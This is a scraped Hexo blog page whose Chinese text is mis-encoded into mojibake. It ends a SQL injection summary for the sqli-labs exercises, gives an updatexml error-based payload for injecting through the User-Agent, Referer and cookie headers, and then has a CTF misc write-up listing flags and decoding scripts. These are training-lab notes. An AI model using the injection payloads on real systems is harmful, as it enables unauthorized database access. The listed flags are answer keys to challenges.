<h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>è€ƒå¯Ÿï¼špostæ³¨å…¥ï¼Œæ—¶é—´ç›²æ³¨</p>
<p>ç¯å¢ƒæœ‰é—®é¢˜ï¼Œè·³è¿‡</p>
<h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>ç¯å¢ƒæœ‰é—®é¢˜</p>
<h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>è€ƒå¯Ÿï¼šheadå¤´æ³¨å…¥ï¼Œuser_agentæ³¨å…¥ï¼ŒåŒæŸ¥è¯¢æ³¨å…¥</p>
<p>é˜…è¯»æºç ï¼Œæ’å…¥äº†uagentå­—æ®µï¼Œä½†æ˜¯æœªåšåˆæ³•æ€§æ£€æµ‹ï¼Œå› æ­¤å¯ä»¥ç”¨åŒæŸ¥è¯¢æ³¨å…¥</p>
<p>burpä¿®æ”¹åŒ…çš„headéƒ¨åˆ†ä¸­çš„userâ€“agent</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(&#39;~&#39;,(database())),1) and &#39;1&#39;&#x3D;&#39;1--+</span><br><span class="line"># æ³¨æ„æœ€åä¸€å®šè¦æœ‰and &#39;1&#39;&#x3D;&#39;1 ç”¨äºé—­åˆå¼•å·ï¼Œå¦åˆ™ä¸èƒ½å¾—åˆ°ç»“æœ</span><br></pre></td></tr></table></figure>
<h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>åŒLess18ï¼Œæœ¬æ¬¡uagentçš„å€¼ä»refererä¸­è·å¾—ï¼Œå› æ­¤åœ¨refererè¿›è¡Œæ³¨å…¥</p>
<h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>è€ƒå¯Ÿï¼šcookieæ³¨å…¥</p>
<p>æ­£å¸¸èµ°ä¸€éæµç¨‹ï¼Œå‘ç°å›æ˜¾çš„cookieä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname:admin</span><br></pre></td></tr></table></figure>
<p>å†æ¬¡åˆ·æ–°é¡µé¢æ—¶ï¼Œåœ¨åŒ…ä¸­ä¼šç›´æ¥å‘é€è¯¥cookie</p>
<p>ä¿®æ”¹è¯¥cookieä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and updatexml(1,concat(&#39;~&#39;,(database())),1) and &#39;1&#39;&#x3D;&#39;1--+</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ•°æ®åº“å</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/15/CTF-Web-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="ckkdrz0yy0001ugusdm9dcp4m" data-title="SQLæ³¨å…¥æ€»ç»“" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/12/hello-world/" class="article-date">
  <time class="dt-published" datetime="2021-01-12T13:52:17.596Z" itemprop="datePublished">2021-01-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/12/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/12/hello-world/" data-id="ckk1u3o4j0002tsus73gadf65" data-title="Hello World" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-æ”»é˜²ä¸–ç•Œç­”æ¡ˆè®°å½•" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-12-31T06:40:57.000Z" itemprop="datePublished">2020-12-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTFç­”æ¡ˆè®°å½•</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="æ”»é˜²ä¸–ç•Œ-miscåˆçº§"><a href="#æ”»é˜²ä¸–ç•Œ-miscåˆçº§" class="headerlink" title="æ”»é˜²ä¸–ç•Œ miscåˆçº§"></a>æ”»é˜²ä¸–ç•Œ miscåˆçº§</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this is flag"></a>this is flag</h2><p>æäº¤flag{th1s_!s_a_d4m0_4la9}å³å¯</p>
<h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>åšæ³•1ï¼špdfè½¬wordåçœ‹åˆ°ç­”æ¡ˆ</p>
<p>åœ¨çº¿è½¬æ¢åœ°å€<a target="_blank" rel="noopener" href="https://app.xunjiepdf.com/pdf2word/">https://app.xunjiepdf.com/pdf2word/</a></p>
<p>åšæ³•2ï¼šchromeæ‰“å¼€pdfï¼Œç›´æ¥ctrl+fæœç´¢flag</p>
<h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>æ­£å¸¸æ‰“å¼€gifï¼Œå‘ç°æœ€åæœ‰ä¸€ä¸ªäºŒç»´ç </p>
<p>ç”¨psæ‰“å¼€gifï¼Œæ‰¾åˆ°é‚£ä¸€å¸§ï¼Œæ‰¾åˆ°å¯¹åº”äºŒç»´ç </p>
<p>äºŒç»´ç éœ€è¦å››ä¸ªè§’ä¸­ä¸‰ä¸ªè§’æ·»åŠ å®šä½æ–¹å—ï¼Œç”¨psæ·»åŠ å®šä½æ–¹å—åï¼Œéšä¾¿ä¸€ä¸ªäºŒç»´ç æ‰«æå·¥å…·å¾—åˆ°flag</p>
<h2 id="åšæŒ60s"><a href="#åšæŒ60s" class="headerlink" title="åšæŒ60s"></a>åšæŒ60s</h2><p>å¾—åˆ°jaræ–‡ä»¶ï¼Œå¯ä»¥ç”¨å‹ç¼©åŒ…è½¯ä»¶æ‰“å¼€æ–‡ä»¶è¿˜åŸå‡ºå·¥ç¨‹</p>
<p>ä½¿ç”¨ideaæ‰“å¼€å·¥ç¨‹ï¼Œåœ¨çˆ†ç‚¸æ–‡ä»¶ä¸‹å¾—åˆ°æ˜æ–‡flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p>
<p>æäº¤åæ˜¾ç¤ºflagé”™è¯¯ï¼Œä½¿ç”¨base64å¯¹flagä¸­å†…å®¹è§£ç å¾—åˆ°ä½†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>å¾—åˆ°104å¼ é»‘ç™½å›¾ç‰‡</p>
<p>ä½¿ç”¨pythonè¯»å–æ–‡ä»¶ï¼Œç™½ä¸º0é»‘ä¸º1ï¼Œå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">white &#x3D; open(&quot;.&#x2F;0.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line">black &#x3D; open(&quot;.&#x2F;1.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">flag_dic &#x3D; &quot;&quot;</span><br><span class="line">for i in range(104):</span><br><span class="line">	with open(&quot;.&#x2F;%d.jpg&quot;%i,&quot;rb&quot;) as f:</span><br><span class="line">		if f.read() &#x3D;&#x3D; white:</span><br><span class="line">			flag_dic +&#x3D; &quot;0&quot;</span><br><span class="line">		else:</span><br><span class="line">			flag_dic +&#x3D; &quot;1&quot;</span><br><span class="line">print(flag_dic)</span><br><span class="line"></span><br><span class="line">01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨åœ¨çº¿çš„äºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²å·¥å…·å¾—åˆ°ç­”æ¡ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ€æ¡Œå­"><a href="#æ€æ¡Œå­" class="headerlink" title="æ€æ¡Œå­"></a>æ€æ¡Œå­</h2><p>æœ€å¤§å­—ç¬¦ä¸è¶…è¿‡fï¼Œåˆ¤æ–­ä¸ºåå…­è¿›åˆ¶</p>
<p>å°†ä¸¤ä¸ªè¿ç»­æ•°å­—è®¾ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä»£è¡¨ä¸€ä¸ªç¬¦å·ã€‚æ‰€æœ‰å­—èŠ‚å¤§äº128ï¼Œè€ŒASCIIç è¡¨å‡å°äº128ï¼Œæ•…å‡å‡å»128</p>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;</span><br><span class="line">count &#x3D; 0</span><br><span class="line">tempstr &#x3D; &quot;&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	tempstr +&#x3D; s</span><br><span class="line">	if len(tempstr) &#x3D;&#x3D; 2:</span><br><span class="line">		ans +&#x3D; chr(int(tempstr, 16) - 128)</span><br><span class="line">		# print(int(tempstr, 16))</span><br><span class="line">		tempstr &#x3D; &quot;&quot;</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr</span><br></pre></td></tr></table></figure>
<h2 id="å¦‚æ¥åä¸‰æŒ"><a href="#å¦‚æ¥åä¸‰æŒ" class="headerlink" title="å¦‚æ¥åä¸‰æŒ"></a>å¦‚æ¥åä¸‰æŒ</h2><p>ä½¿ç”¨ä¸ä½›è®ºç¦…è®ºå›ï¼Œ<a target="_blank" rel="noopener" href="http://keyfc.net/bbs/tools/tudoucode.aspx%EF%BC%8C%E5%AF%B9%E6%96%87%E5%AD%97%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">http://keyfc.net/bbs/tools/tudoucode.aspxï¼Œå¯¹æ–‡å­—è¿›è¡Œè§£å¯†å¾—åˆ°</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä½¿ç”¨ROT13ç¼–ç è¿›è¡Œè§£å¯†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</span><br></pre></td></tr></table></figure>
<p>å†ä½¿ç”¨base64è¿›è¡Œç¼–ç ï¼Œå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure>
<h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>å·¥å…·ï¼šç¦æ˜•pdfç¼–è¾‘å™¨</p>
<p>æ€è·¯ï¼šä»pdfæ–‡ä»¶ä¸­æ‰¾åˆ°å­—ç¬¦ï¼Œå†è¿›è¡ŒåŠ è§£å¯†</p>
<p>å»é™¤æ— ç”¨ä¿¡æ¯åï¼Œé€‰ä¸­â€œç¼–è¾‘å¯¹è±¡â€ï¼Œæ¡†é€‰ä¸€å¤§ç‰‡åŒºåŸŸï¼Œå‘ç°å­—ç¬¦ä¸²</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</span><br></pre></td></tr></table></figure>
<p>ç±»ä¼¼äºåŸ¹æ ¹å¯†ç ï¼Œä½†åŸ¹æ ¹å¯†ç ä¸º5ä½ä¸€ç»„ï¼Œä¸ç¬¦åˆã€‚æ­¤å­—ç¬¦ä¸²ä¸­åªæœ‰ABä¸¤ç§å­—ç¬¦ï¼Œç±»ä¼¼äºäºŒè¿›åˆ¶ï¼Œè”æƒ³æ‘©æ–¯å¯†ç ï¼Œè§£å¯†åå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="åŸ¹æ ¹å¯†ç "><a href="#åŸ¹æ ¹å¯†ç " class="headerlink" title="åŸ¹æ ¹å¯†ç "></a>åŸ¹æ ¹å¯†ç </h3><p>é‡‡ç”¨aå’Œbä¸¤ç§å­—ç¬¦è¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼Œ5ä½å­—ç¬¦ä¸€ç»„</p>
<h3 id="æ‘©æ–¯å¯†ç "><a href="#æ‘©æ–¯å¯†ç " class="headerlink" title="æ‘©æ–¯å¯†ç "></a>æ‘©æ–¯å¯†ç </h3><h2 id="simpleRAR"><a href="#simpleRAR" class="headerlink" title="simpleRAR"></a>simpleRAR</h2><p>å·¥å…·ï¼šwinhexï¼Œstegsolveï¼ˆå›¾ç‰‡éšå†™å·¥å…·ï¼‰ï¼Œphotoshop</p>
<p>é¦–å…ˆä¸‹è½½å¾—åˆ°ä¸€ä¸ªraræ–‡ä»¶ï¼Œæ‰“å¼€åæç¤ºâ€œsecure.pngâ€æ–‡ä»¶å¤´æŸåã€‚</p>
<p>å°è¯•ä½¿ç”¨winrarç›´æ¥ä¿®å¤ï¼Œç»“æœæ˜¯æŠŠsecure.pngç›´æ¥åˆ é™¤ã€‚å°è¯•å¤±è´¥ã€‚</p>
<p>ä¸Šç½‘æŸ¥é˜…rarå—æ„æˆåï¼Œå°†â€œCflag is not here?â€ååå…­è¿›åˆ¶çš„7Aæ›´æ”¹ä¸º74ã€‚æˆåŠŸè§£å‹å¾—åˆ°secure.png</p>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°†pngæ”¾å…¥photoshopä¸­ã€‚photoshopæç¤ºépngæ–‡ä»¶ã€‚</p>
<p>ä½¿ç”¨winhexæ‰“å¼€secure.pngï¼Œå¤´éƒ¨æ ‡è¯†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">474946</span><br></pre></td></tr></table></figure>
<p>è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªgifæ–‡ä»¶ã€‚æ›´æ”¹åç¼€ååæ”¾å…¥photoshopä¸­ï¼Œå¾—åˆ°ä¸¤ä¸ªå›¾å±‚ã€‚</p>
<p>åˆ†åˆ«å°†ä¸¤ä¸ªå›¾å±‚çš„ç©ºç™½å›¾ç‰‡æ”¾å…¥stegsolveï¼Œå¾—åˆ°äºŒç»´ç ã€‚æ”¾å…¥photoshopåˆæˆäºŒç»´ç å¹¶è¡¥å……ä¸‰ä¸ªè§’ï¼Œæ‰«ç åå¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
<h3 id="rarå¤´éƒ¨æ„æˆ"><a href="#rarå¤´éƒ¨æ„æˆ" class="headerlink" title="rarå¤´éƒ¨æ„æˆ"></a>rarå¤´éƒ¨æ„æˆ</h3><p>æ¯ä¸ªæ•°æ®å—ç»“æ„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEAD_CRCï¼šæ ¡éªŒç ï¼Œ2å­—èŠ‚</span><br><span class="line">HEAD_TYPEï¼šå—ç±»å‹ï¼Œ1å­—èŠ‚</span><br><span class="line">HEAD_FLAGSï¼šå—æ ‡è®°ï¼Œ2å­—èŠ‚</span><br><span class="line">æœ€åä¸¤å­—èŠ‚ï¼šå—å¤§å°</span><br></pre></td></tr></table></figure>
<p>æ•´ä¸ªRARæ–‡ä»¶æ•°æ®å—æ„æˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ ‡è®°å—ï¼šHEAD_TYPE&#x3D;0x72</span><br><span class="line">å‹ç¼©æ–‡ä»¶å¤´ï¼šHEAD_TYPE&#x3D;0x74</span><br><span class="line">æ–‡ä»¶å¤´ï¼šHEAD_TYPE&#x3D;0x74</span><br></pre></td></tr></table></figure>
<h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>å·¥å…·ï¼šwinhex</p>
<p>çŸ¥è¯†ç‚¹ï¼šzipä¼ªåŠ å¯†ï¼Œbase64éšå†™</p>
<p>é¦–å…ˆè¦ç”¨winhexï¼Œä¿®æ”¹zipçš„å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºå…¨å±€åŠ å¯†å¤„çš„å­—èŠ‚</p>
<p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶stego.txtã€‚ç»“åˆé¢˜ç›®æç¤ºï¼Œå¯¹å…¶è¿›è¡Œbase64è§£ç ï¼Œå¹¶æœªå¾—åˆ°æœŸæœ›çš„ç»“æœã€‚</p>
<p>æŸ¥é˜…wpå¯çŸ¥è€ƒå¯Ÿbase64éšå†™ã€‚base64éšå†™ä¸ç­‰äºbase64è§£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import msvcrt</span><br><span class="line">import time</span><br><span class="line">b64chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#39;</span><br><span class="line">with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:</span><br><span class="line">    bin_str &#x3D; &#39;&#39;</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        # å»é™¤å¤´å°¾çš„æ¢è¡Œç¬¦</span><br><span class="line">        stegb64 &#x3D; str(line, &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">        # åŸºäºbase64è§£ç åˆç¼–ç ï¼Œè¾¾åˆ°å»é™¤éšå†™çš„ç¬¦å·çš„ç›®çš„</span><br><span class="line">        row64 &#x3D; str(base64.b64encode(base64.b64decode(stegb64)),&quot;utf-8&quot;)</span><br><span class="line">        # åŸºäºbase64çš„éšå†™ï¼Œéƒ½åœ¨æœ€åä¸€ä¸ªå­—ç¬¦ä¸Šä½“ç°ã€‚å› æ­¤ç®—ä¸€ä¸‹ä¸¤ä¸ªå­—ç¬¦ä¸²æœ€åä¸€ä¸ªå­—ç¬¦çš„å·®å€¼</span><br><span class="line">        offset &#x3D; abs(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]) - b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        print(offset)</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;))</span><br><span class="line">        #print(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1])</span><br><span class="line">        #print(b64chars.index(stegb64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        #print(b64chars.index(row64.replace(&#39;&#x3D;&#39;,&#39;&#39;)[-1]))</span><br><span class="line">        # ç­‰å·çš„æ•°é‡*2ç­‰äºæœ€åè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">        equalnum &#x3D; stegb64.count(&#39;&#x3D;&#39;)</span><br><span class="line">        if equalnum:</span><br><span class="line">            bin_str +&#x3D; bin(offset)[2:].zfill(equalnum * 2)</span><br><span class="line">        print(bin(offset))</span><br><span class="line">        print(bin(offset)[2:])</span><br><span class="line">        # å³å¯¹é½åï¼Œåœ¨å¤´éƒ¨å¡«å……0</span><br><span class="line">        print(bin(offset)[2:].zfill(equalnum * 2))</span><br><span class="line">        # 8ä¸ªbitè½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦</span><br><span class="line">        print(&#39;&#39;.join([chr(int(bin_str[i:i+8],2)) for i in range(0, len(bin_str), 8)]))</span><br><span class="line">        # time.sleep(3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="zipçš„ä¼ªåŠ å¯†"><a href="#zipçš„ä¼ªåŠ å¯†" class="headerlink" title="zipçš„ä¼ªåŠ å¯†"></a>zipçš„ä¼ªåŠ å¯†</h3><p>zipç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šå‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼Œæ ¹æ®ä¸‰ä¸ªåŒºåŸŸçš„ä¸åŒï¼ŒåŒºåˆ†zipæ˜¯éåŠ å¯†ã€ä¼ªåŠ å¯†è¿˜æ˜¯åŠ å¯†çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š </span><br><span class="line">50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰ </span><br><span class="line">14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line">00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰ å¤´æ–‡ä»¶æ ‡è®°å2bytes</span><br><span class="line">08 00ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line">5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line">F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line">16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ </span><br><span class="line">19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ </span><br><span class="line">17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ </span><br><span class="line">07 00ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line">00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦ </span><br><span class="line">6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line">å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š </span><br><span class="line"></span><br><span class="line">50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50) </span><br><span class="line"></span><br><span class="line">3F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line">00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œä¼ªåŠ å¯†çš„å…³é”®ï¼‰ ç›®å½•æ–‡ä»¶æ ‡è®°å4bytes</span><br><span class="line">08 00ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line">5A 